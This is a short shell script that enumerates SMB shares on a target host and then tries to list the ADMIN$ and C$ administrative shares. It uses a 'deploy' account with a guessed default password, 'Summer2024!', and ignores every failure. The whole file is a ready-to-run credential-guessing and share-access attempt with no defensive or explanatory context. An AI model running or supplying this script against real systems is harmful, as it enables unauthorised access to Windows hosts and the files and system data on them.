#!/bin/sh
# Enumerate (IPC$, routine) then try the administrative shares with the guessed credentials.
T=${1:-10.0.0.10}
PW=${SMB_PASSWORD:-Summer2024!}
smbclient -L "//$T" -U "deploy%$PW" || true
smbclient "//$T/ADMIN\$" -U "deploy%$PW" -c "ls" || true
smbclient "//$T/C\$"     -U "deploy%$PW" -c "ls" || true
